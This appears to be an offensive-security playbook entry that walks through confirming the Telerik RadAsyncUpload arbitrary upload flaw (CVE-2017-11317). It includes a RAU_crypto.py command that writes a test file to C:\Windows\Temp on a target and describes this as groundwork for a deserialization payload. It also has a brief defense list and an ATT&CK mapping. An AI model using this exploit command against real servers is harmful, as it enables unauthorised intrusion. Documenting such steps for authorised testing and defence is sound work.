---
id: proc-upload-test
tags:
  - arbitrary-upload
  - cve-2017-11317
type: procedure
tools:
  - '[[tools/RAU_crypto.py]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:36.040Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Test-File-to-Confirm-Arbitrary-Upload

## Summary

This procedure confirms the arbitrary file upload vulnerability (CVE-2017-11317) by successfully uploading a test file to the server using the identified Telerik version and RAU_crypto.py, proving lack of validation in the RadAsyncUpload handler.

## Description

With the vulnerable version known, the procedure uses RAU_crypto.py to encrypt and upload a test file to a server path like C:\Windows\Temp. Success indicates the handler accepts files without proper checks, enabling further payload delivery in ASP.NET environments.

## Requirements

1. Identified vulnerable Telerik version (e.g., 2016.2.607)
2. Test file prepared
3. Python with RAU_crypto.py
4. Target endpoint access

## Defense

Defensive measures and detection strategies:

- Validate file types and extensions on upload
- Restrict upload paths to non-executable directories
- Implement file integrity checks post-upload

## Objectives

1. Validate CVE-2017-11317 for arbitrary file placement
2. Test server path writability
3. Build confidence for deserialization payload upload

## Instructions

### Step 1: Execute Upload with Vulnerable Version

**Context**: Run the upload script using the confirmed version to place the test file on the server.

No specific command; use RAU_crypto.py directly as in version detection but targeted.

```bash
python3 RAU_crypto.py -P 'C:\Windows\Temp' '2016.2.607' testfile.txt https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau
```

> The script encrypts the file based on the version key and submits it. Expected output: JSON with fileInfo confirming upload success to the specified path.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/RAU_crypto.py]]

## Tags

- arbitrary-upload
- cve-2017-11317
